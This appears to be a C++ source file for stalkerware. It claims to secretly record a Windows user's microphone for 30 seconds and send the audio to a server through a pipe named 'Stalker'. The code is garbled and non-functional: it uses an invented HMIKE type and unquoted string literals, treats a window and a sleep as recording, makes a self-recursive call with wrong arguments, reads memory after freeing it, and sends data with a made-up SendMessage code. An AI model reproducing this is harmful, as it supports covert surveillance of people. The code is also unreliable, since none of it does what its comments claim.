#include <Windows.h>
#include <iostream>
#include <string>

using namespace std;

int main() {
    // Opens a handle to the microphone
    HMIKE hMike = CreateFile(TEXT("\\Device\\NamedPipe\\Stalker"), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);
    if (hMike == INVALID_HANDLE_VALUE) {
        cout << Error opening microphone << endl;
        return 1;
    }

    // Start recording audio for 30 seconds
    time_t startTime = time(NULL);
    while ((time(NULL) - startTime) < 30) {
        string audioData = RecordAudio();
        SendToServer(hMike, audioData.c_str());
    }

    // Close the microphone handle
    CloseHandle(hMike);

    return 0;
}

string RecordAudio() {
    // Opens a new window with a 30-second recording
    HWND hwnd = CreateWindowEx(WS_EX_APPWINDOW, TEXT(Stalker), TEXT(Recording), WS_OVERLAPPED | WS_VISIBLE | WS_MAXIMIZE, GetSystemMetrics(SM_CXSCREEN) / 2 - 300, GetSystemMetrics(SM_CYSCREEN) / 2 - 150, 600, 480, NULL, NULL, NULL, NULL);
    if (hwnd == NULL) {
        cout << Error creating recording window << endl;
        return string();
    }

    // Starts the recording
    ShowWindow(hwnd, SW_SHOW);
    Sleep(30000);

    // Ends the recording and destroys the window
    ShowWindow(hwnd, SW_HIDE);
    DestroyWindow(hwnd);

    string audioData = GetAudioFromRecording();
    return audioData;
}

string GetAudioFromRecording() {
    // Loads the recording data into a buffer
    char *buffer = (char *)malloc(30 * 480 * sizeof(unsigned short));
    if (!buffer) {
        cout << Error allocating memory for audio data << endl;
        return string();
    }

    // Gets the audio data from the recording buffer
    GetAudioFromRecording(buffer, 30 * 480);

    // Frees the memory allocated by the buffer
    free(buffer);

    return string(buffer, 30 * 480 - 1);
}

void SendToServer(HMike hMike, const char *audioData) {
    // Sends the audio data to the server using the microphone handle
    if (!SendMessage(hMike, MSG_WRITE, (WPARAM)(LPTSTR)audioData, 0)) {
        cout << Error sending audio data to server << endl;
    }
}
